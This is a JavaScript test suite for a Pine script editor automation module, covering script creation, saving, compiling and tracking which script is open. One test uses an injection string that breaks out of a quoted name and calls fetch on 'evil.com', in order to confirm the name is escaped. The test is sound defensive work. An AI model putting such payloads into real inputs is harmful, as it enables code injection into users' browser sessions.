/**
 * Tests for Pine script lifecycle safety: pine_new must create a real script
 * slot (never just overwrite the open buffer), and save/compile must report
 * which script slot they wrote into.
 *
 * Regression context: pine_new used to be a plain Monaco setValue(), so the
 * next save silently overwrote whatever saved script was open in the editor.
 */
import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import {
  newScript, save, smartCompile, openScript,
  diffScriptLists, getTrackedOpenScript, _setTrackedOpenScript,
} from '../src/core/pine.js';

// ── Mock harness ─────────────────────────────────────────────────────────

const SCRIPT_A = { id: 'USER;aaa', name: 'Script A', title: 'Script A', version: '5.0', modified: 1000 };
const SCRIPT_B = { id: 'USER;bbb', name: 'Script B', title: 'Script B', version: '2.0', modified: 900 };
const SCRIPT_NEW = { id: 'USER;new', name: 'Fresh script', title: 'Fresh script', version: '1.0', modified: 2000 };

/**
 * Builds a _deps object whose evaluate/evaluateAsync dispatch on markers
 * embedded in the injected page expressions. `lists` is the sequence of
 * pine-facade list responses; the last entry repeats once exhausted.
 */
function makeDeps({
  lists = [[SCRIPT_A, SCRIPT_B]],
  titleMenu = { clicked: true, label: 'Script A' },
  createNewItem = { clicked: true },
  newMenuItem = { clicked: true, label: 'Indicator' },
  dialogResult = { handled: false },
  saveNameDialog = { handled: true },
  compileButton = 'Pine Save',
  editorSaveButton = { clicked: true },
  openScriptResult = { success: true, name: 'Script A', id: 'USER;aaa', lines: 10 },
} = {}) {
  const calls = [];
  let listIdx = 0;
  const handler = async (expr) => {
    calls.push(expr);
    if (expr.includes('pine-facade/list')) {
      const list = lists[Math.min(listIdx, lists.length - 1)];
      listIdx++;
      return { scripts: list };
    }
    if (expr.includes('__openScriptTitleMenu')) { return titleMenu; }
    if (expr.includes('__clickCreateNewMenuItem')) { return createNewItem; }
    if (expr.includes('__clickNewScriptMenuItem')) { return newMenuItem; }
    if (expr.includes('__dismissDialog')) { return dialogResult; }
    if (expr.includes('pine-facade/list') && expr.includes('setValue')) { return openScriptResult; }
    if (expr.includes('__clickEditorSaveButton')) { return editorSaveButton; }
    if (expr.includes('__handleSaveNameDialog')) { return saveNameDialog; }
    if (expr.includes('__clickCompileButton')) { return compileButton; }
    if (expr.includes('__readOpenScriptName')) { return 'Script A'; }
    if (expr.includes('getModelMarkers')) { return []; }
    if (expr.includes('getAllStudies')) { return 5; }
    if (expr.includes('findMonacoEditor')) { return true; }
    return undefined;
  };
  const keyEvents = [];
  return {
    calls,
    keyEvents,
    _deps: {
      evaluate: handler,
      evaluateAsync: handler,
      getClient: async () => ({ Input: { dispatchKeyEvent: async (e) => { keyEvents.push(e); } } }),
      sleep: async () => {},
    },
  };
}

beforeEach(() => { _setTrackedOpenScript(null); });

// ── diffScriptLists() ────────────────────────────────────────────────────

describe('diffScriptLists() — detect which slot a save wrote into', () => {
  it('detects a newly created script', () => {
    const diff = diffScriptLists([SCRIPT_A], [SCRIPT_A, SCRIPT_NEW]);
    assert.equal(diff.change, 'created');
    assert.equal(diff.id, 'USER;new');
    assert.equal(diff.name, 'Fresh script');
  });

  it('detects a version bump on an existing script', () => {
    const bumped = { ...SCRIPT_A, version: '6.0', modified: 1500 };
    const diff = diffScriptLists([SCRIPT_A, SCRIPT_B], [bumped, SCRIPT_B]);
    assert.equal(diff.change, 'updated');
    assert.equal(diff.id, 'USER;aaa');
  });

  it('returns null when nothing changed', () => {
    assert.equal(diffScriptLists([SCRIPT_A, SCRIPT_B], [SCRIPT_A, SCRIPT_B]), null);
  });

  it('returns null when either list is unavailable', () => {
    assert.equal(diffScriptLists(null, [SCRIPT_A]), null);
    assert.equal(diffScriptLists([SCRIPT_A], null), null);
  });
});

// ── newScript() ──────────────────────────────────────────────────────────

describe('newScript() — must create a real script slot', () => {
  it('creates a new slot: list grows by one and the new script is returned', async () => {
    const m = makeDeps({ lists: [[SCRIPT_A, SCRIPT_B], [SCRIPT_A, SCRIPT_B, SCRIPT_NEW]] });
    const result = await newScript({ type: 'indicator', _deps: m._deps });
    assert.equal(result.success, true);
    assert.equal(result.created, true);
    assert.equal(result.script.id, 'USER;new');
    assert.equal(result.script.name, 'Fresh script');
  });

  it('tracks the new script as the open one', async () => {
    const m = makeDeps({ lists: [[SCRIPT_A], [SCRIPT_A, SCRIPT_NEW]] });
    await newScript({ type: 'indicator', _deps: m._deps });
    assert.equal(getTrackedOpenScript().id, 'USER;new');
  });

  it('REGRESSION: never writes into the open Monaco buffer via setValue', async () => {
    const m = makeDeps({ lists: [[SCRIPT_A], [SCRIPT_A, SCRIPT_NEW]] });
    await newScript({ type: 'indicator', _deps: m._deps });
    for (const call of m.calls) {
      assert.ok(!call.includes('setValue'), `pine_new must not setValue into the open buffer:\n${call}`);
    }
  });

  it('throws when no new slot appears in the script list', async () => {
    const m = makeDeps({ lists: [[SCRIPT_A, SCRIPT_B]] });
    await assert.rejects(
      newScript({ type: 'indicator', _deps: m._deps }),
      /no new script/i
    );
  });

  it('throws when the script title menu cannot be found (no silent fallback)', async () => {
    const m = makeDeps({ titleMenu: { clicked: false } });
    await assert.rejects(
      newScript({ type: 'indicator', _deps: m._deps }),
      /title menu/i
    );
  });

  it('throws when the Create new menu item cannot be found', async () => {
    const m = makeDeps({ createNewItem: { clicked: false } });
    await assert.rejects(
      newScript({ type: 'indicator', _deps: m._deps }),
      /create new/i
    );
  });

  it('throws when the script type menu item cannot be found', async () => {
    const m = makeDeps({ newMenuItem: { clicked: false } });
    await assert.rejects(
      newScript({ type: 'strategy', _deps: m._deps }),
      /menu item/i
    );
  });

  it('saves via the editor save button, not a focus-dependent Ctrl+S', async () => {
    const m = makeDeps({ lists: [[SCRIPT_A], [SCRIPT_A, SCRIPT_NEW]] });
    await newScript({ type: 'indicator', _deps: m._deps });
    assert.ok(m.calls.some(c => c.includes('__clickEditorSaveButton')), 'expected an editor save-button click');
    assert.equal(m.keyEvents.length, 0, 'newScript must not rely on CDP keyboard events for saving');
  });

  it('throws when the editor save button cannot be found', async () => {
    const m = makeDeps({ editorSaveButton: { clicked: false } });
    await assert.rejects(
      newScript({ type: 'indicator', _deps: m._deps }),
      /save button/i
    );
  });

  it('rejects unknown script types', async () => {
    const m = makeDeps();
    await assert.rejects(newScript({ type: 'widget', _deps: m._deps }), /type/i);
  });

  it('passes a requested name into the save dialog, injection-safe', async () => {
    const m = makeDeps({ lists: [[SCRIPT_A], [SCRIPT_A, SCRIPT_NEW]] });
    const evil = 'My"); fetch("https://evil.com"); ("script';
    await newScript({ type: 'indicator', name: evil, _deps: m._deps });
    const dialogCall = m.calls.find(c => c.includes('__handleSaveNameDialog'));
    assert.ok(dialogCall, 'expected a save-name dialog call');
    assert.ok(dialogCall.includes(JSON.stringify(evil)), 'name must be JSON-escaped in the injected expression');
  });

  it('dismisses an unsaved-changes prompt without saving the old buffer', async () => {
    const m = makeDeps({
      lists: [[SCRIPT_A], [SCRIPT_A, SCRIPT_NEW]],
      dialogResult: { handled: true, action: 'discard', button_text: "Don't save" },
    });
    const result = await newScript({ type: 'indicator', _deps: m._deps });
    assert.equal(result.success, true);
    const dismissCall = m.calls.find(c => c.includes('__dismissDialog'));
    assert.ok(dismissCall, 'expected pollForDialog call for pending-changes dialog');
  });

  it('calls pollForDialog after menu navigation (not a one-shot check)', async () => {
    const m = makeDeps({ lists: [[SCRIPT_A], [SCRIPT_A, SCRIPT_NEW]] });
    await newScript({ type: 'indicator', _deps: m._deps });
    const dialogCalls = m.calls.filter(c => c.includes('__dismissDialog'));
    assert.ok(dialogCalls.length > 0, 'expected at least one pollForDialog evaluate call');
  });
});

// ── save() ───────────────────────────────────────────────────────────────

describe('save() — must report the slot it wrote into', () => {
  it('reports saved_to when an existing script got a version bump', async () => {
    const bumped = { ...SCRIPT_A, version: '6.0', modified: 1500 };
    const m = makeDeps({ lists: [[SCRIPT_A, SCRIPT_B], [bumped, SCRIPT_B]] });
    const result = await save({ _deps: m._deps });
    assert.equal(result.success, true);
    assert.equal(result.saved_to.id, 'USER;aaa');
    assert.equal(result.saved_to.name, 'Script A');
  });

  it('reports saved_to null with a note when nothing changed', async () => {
    const m = makeDeps({ lists: [[SCRIPT_A, SCRIPT_B]] });
    const result = await save({ _deps: m._deps });
    assert.equal(result.success, true);
    assert.equal(result.saved_to, null);
    assert.ok(result.note, 'expected an explanatory note');
  });

  it('warns when the saved slot differs from the tracked open script', async () => {
    _setTrackedOpenScript({ id: 'USER;new', name: 'Fresh script' });
    const bumped = { ...SCRIPT_A, version: '6.0', modified: 1500 };
    const m = makeDeps({ lists: [[SCRIPT_A, SCRIPT_B], [bumped, SCRIPT_B]] });
    const result = await save({ _deps: m._deps });
    assert.ok(result.warning, 'expected a mismatch warning');
    assert.ok(result.warning.includes('Script A'), 'warning should name the actually-saved script');
  });
});

// ── smartCompile() ───────────────────────────────────────────────────────

describe('smartCompile() — must report the slot it wrote into', () => {
  it('reports saved_to when the save button wrote a script', async () => {
    const bumped = { ...SCRIPT_B, version: '3.0', modified: 1500 };
    const m = makeDeps({ lists: [[SCRIPT_A, SCRIPT_B], [SCRIPT_A, bumped]] });
    const result = await smartCompile({ _deps: m._deps });
    assert.equal(result.success, true);
    assert.equal(result.saved_to.id, 'USER;bbb');
    assert.equal(result.saved_to.name, 'Script B');
  });

  it('reports saved_to null when no script changed (e.g. Add to chart only)', async () => {
    const m = makeDeps({ lists: [[SCRIPT_A, SCRIPT_B]], compileButton: 'Add to chart' });
    const result = await smartCompile({ _deps: m._deps });
    assert.equal(result.saved_to, null);
  });

  it('warns on mismatch with the tracked open script', async () => {
    _setTrackedOpenScript({ id: 'USER;new', name: 'Fresh script' });
    const bumped = { ...SCRIPT_A, version: '6.0', modified: 1500 };
    const m = makeDeps({ lists: [[SCRIPT_A, SCRIPT_B], [bumped, SCRIPT_B]] });
    const result = await smartCompile({ _deps: m._deps });
    assert.ok(result.warning, 'expected a mismatch warning');
  });
});

// ── getSource() ──────────────────────────────────────────────────────────

describe('getSource() — identifies the open script', () => {
  it('includes the open script name read from the editor title', async () => {
    const handler = async (expr) => {
      if (expr.includes('__readOpenScriptName')) { return 'Script A'; }
      if (expr.includes('getValue')) { return '//@version=6\nindicator("x")'; }
      if (expr.includes('findMonacoEditor')) { return true; }
      return undefined;
    };
    const _deps = { evaluate: handler, evaluateAsync: handler, sleep: async () => {} };
    const { getSource } = await import('../src/core/pine.js');
    const result = await getSource({ _deps });
    assert.equal(result.open_script, 'Script A');
  });
});

// ── openScript() ─────────────────────────────────────────────────────────

describe('openScript() — tracks what the caller believes is open', () => {
  it('records the opened script for later mismatch detection', async () => {
    const handler = async (expr) => {
      if (expr.includes('pine-facade/list')) {
        return { success: true, name: 'Script A', id: 'USER;aaa', lines: 3 };
      }
      if (expr.includes('findMonacoEditor')) { return true; }
      return undefined;
    };
    const _deps = { evaluate: handler, evaluateAsync: handler, sleep: async () => {} };
    await openScript({ name: 'Script A', _deps });
    assert.equal(getTrackedOpenScript().id, 'USER;aaa');
  });
});
